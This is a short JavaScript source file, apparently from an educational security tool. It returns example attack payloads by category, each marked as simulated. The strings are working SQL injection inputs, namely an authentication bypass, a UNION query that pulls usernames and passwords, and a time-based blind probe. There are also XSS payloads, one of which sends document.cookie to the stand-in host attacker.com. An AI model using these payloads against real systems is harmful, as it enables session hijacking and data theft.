export const generateSimulatedPayload = (category, context) => {
  const disclaimer = '\n\n🚨 SIMULATED PAYLOAD - NON-EXECUTABLE - EDUCATIONAL ONLY 🚨\n';
  
  const payloads = {
    SQL_INJECTION: `${disclaimer}
-- Simulated SQL Injection Examples (DO NOT EXECUTE):

1. Authentication Bypass:
   ' OR '1'='1' --
   admin' --

2. Data Extraction:
   ' UNION SELECT username, password FROM users --

3. Time-based Blind:
   ' OR SLEEP(5) --

Note: These are logic-level demonstrations. Real exploitation requires proper authorization and legal context.`,

    XSS: `${disclaimer}
<!-- Simulated XSS Payloads (DO NOT EXECUTE) -->

1. Basic Alert:
   <script>alert('XSS')</script>

2. Cookie Theft (concept):
   <script>fetch('//attacker.com?c='+document.cookie)</script>

3. DOM Manipulation:
   <img src=x onerror="alert('XSS')">

Note: Modern browsers and CSP headers block many of these. These are educational examples only.`,

    HARDCODED_SECRETS: `${disclaimer}
This is not an executable payload, but rather a demonstration of risk:

Impact Scenario:
- Attacker finds secret in public repository
- Uses secret to authenticate to service
- Gains unauthorized access to resources
- May extract data, modify systems, or escalate privileges

Mitigation: Immediately rotate the exposed secret and implement proper secret management.`,

    default: `${disclaimer}
Simulated attack vector for ${category}.

This represents the logical flow an attacker might follow, but contains no executable code or real exploit instructions.`
  };

  return payloads[category] || payloads.default;
};
